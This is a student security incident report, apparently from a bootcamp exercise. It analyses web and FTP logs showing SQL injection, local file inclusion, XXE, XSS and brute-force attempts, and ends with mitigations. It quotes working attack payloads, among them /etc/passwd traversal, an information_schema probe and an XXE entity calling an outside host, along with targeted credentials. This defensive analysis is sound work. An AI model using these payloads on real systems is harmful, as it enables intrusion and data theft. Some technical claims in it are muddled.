
# Incident Report '8'

  

Matt, Mohamed, Peter, Rajan, Omozaye | Lighthouse Labs Desk 10

  

Date and time of attack:
Attack start: 28/09/2020 07:25:42:00AM
Attack end: 30/09/2020 11:52:38:00AM
  

Attack vector:

## Vector Diagnosis

1. Local File Inclusion, SQL Injection, XXE Injection, XSS, FTP Brutefoce, HTTP Bruteforce.

2. Attempted SQL Injection in which they attempted to gain information about the 'information_schema' within our SQL DB by outputting table/column output. Attempted to bruteforce login via HTML/FTP. Attempted to determine if server was vulnerable to XSS via XXE injection. Attempted to traverse via LFI. 
  

## Attack Analysis

1. In SQL, the 'information_schema' was the target. Query was issued 200 status, no SQL logs, most likely successful. HTTP Bruteforce attempts were unsuccessful and were blocked as unauthorized 403 status. XXE injection was likely successful, shown 200 status. 

2. Add the proof of the attack - e.g. URL in encoded as well as decoded format.

  

**Example of attacks below**

Performing local file inclusion to access username list on /etc/passwd file
```
113.53.75.43--[30/Sep/2020:07:49:32-0400]"GET/login.php?file=.\/\.\.\/\.\/etc/passwdHTTP/1.1"2003343"http://www.cybintnews.com/index.html?file=.\/\.\.\/\.\/etc/passwd"
```

SQL Injection targeting columns from 'Information_schema'
```
 ??id=5 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'HTTP/1.1"2003343"http://www.cybintnews.com/index.html??id=5 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'"
```

XXE is attempting to load external DTF  
```
158.52.23.93--[30/Sep/2020:07:49:26-0400]"GET/login.php?upload=<foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://57.21.52.73:22/">%dtd;]><xxx/>]]></foo>HTTP/1.1"2003343"http://www.cybintnews.com/index.html?upload=<foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://57.21.52.73:22/">%dtd;]><xxx/>]]></foo>"
```

Using XXE to determine if XSS is possible 
```
138.27.84.74--[30/Sep/2020:07:49:26-0400]"GET/index.html?upload=<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>HTTP/1.1"2003343"http://www.cybintnews.com/index.html?upload=<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
```


**List of targeted FTP Users**
| Usernames  | Attempts |
| ------------- |:-------------:| 
| admin  | **803** |
| root | **399** |

**List of most targeted FTP Passwords**
| Passwords  | Attempts |
| ------------- |:-------------:| 
| admin1234  | **95** |
| Adminpass123 | **72** |
| dsvasdvasdv | **72** |
| p@ssword12!  | **72** |
| wqevqv | **72** |
| we | **72**
| asdfvasa | **70** |
| dsa | **70** |
| sdvas | **70** |
| sdvav | **70** |

**Sample of attacks**  

IP | Country | Events | Example of attack
--- | --- | --- | --- |
164.45.76.23 | United States | **408** | `164.45.76.23 - - [28/Sep/2020:07:25:49 +0000] 164.45.76.23:21 - 164.45.76.23:21 - LOGIN FAILED: admin:we (Incorrect: ) FTP Auth Attempts`
186.26.85.78 | Brazil | **399** | `FTP Auth Attempts`
74.213.66.24 | Puerto Rico | **399** | `FTP Auth Attempts`
86.44.133.63 | Ireland | **87** | `/login.php??id=5 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > `
138.27.84.74 | United States | **39** | `/login.php?loginusername=administrator&loginpassword=66776677`
113.53.75.43 | Thailand | **1** | `/login.php?file=.\/\.\.\/\.\/etc/passwd`


## Signature / CVE Details

**CVE Example Below**

```

```

  

## Mitigation Steps

Disable DTD - External entities within HTML5. Whitelist only FTP port 21, and use SFTP over SSH. Santize Inputs.
